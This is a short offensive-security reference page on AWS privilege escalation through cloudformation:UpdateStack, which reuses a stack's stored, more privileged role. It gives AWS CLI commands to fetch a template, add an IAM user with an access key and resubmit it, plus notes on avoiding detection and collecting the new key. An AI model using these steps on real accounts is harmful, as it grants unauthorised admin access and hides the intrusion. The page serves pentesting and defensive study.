---
title: "UpdateStack: change a stack that runs a privileged stack role"
description: "cloudformation:UpdateStack to change a stack that runs with a privileged stack role and provision attacker-controlled resources."
keywords:
  - UpdateStack
  - CloudFormation
  - stack role
  - deployment
  - resource
---

# UpdateStack

A deployed CloudFormation stack may have been created with a **stack role** more privileged than you. `cloudformation:UpdateStack` reuses that stored role by default, so submitting a modified template provisions whatever the role can create, including IAM principals, with no `PassRole` of your own.

## Update with the stored role

```bash
# fetch the current template, add an admin user or policy attachment, resubmit
aws cloudformation get-template --stack-name <stack> --query TemplateBody > t.json
# edit t.json to add e.g. an AWS::IAM::User with an access key
aws cloudformation update-stack --stack-name <stack> \
  --template-body file://t.json --capabilities CAPABILITY_NAMED_IAM
```

## Exploitation notes

- The stack reuses its existing role unless you pass a different `--role-arn`, so you inherit its privileges for free.
- Keep the rest of the template intact to avoid destroying resources and drawing attention; add, do not replace.
- Stack outputs can surface the created key directly.

## Tools

- **AWS CLI** (`cloudformation get-template` / `update-stack`).
- **Pacu**: CloudFormation modules.

## References

- [Rhino Security Labs: AWS privilege escalation (UpdateStack)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
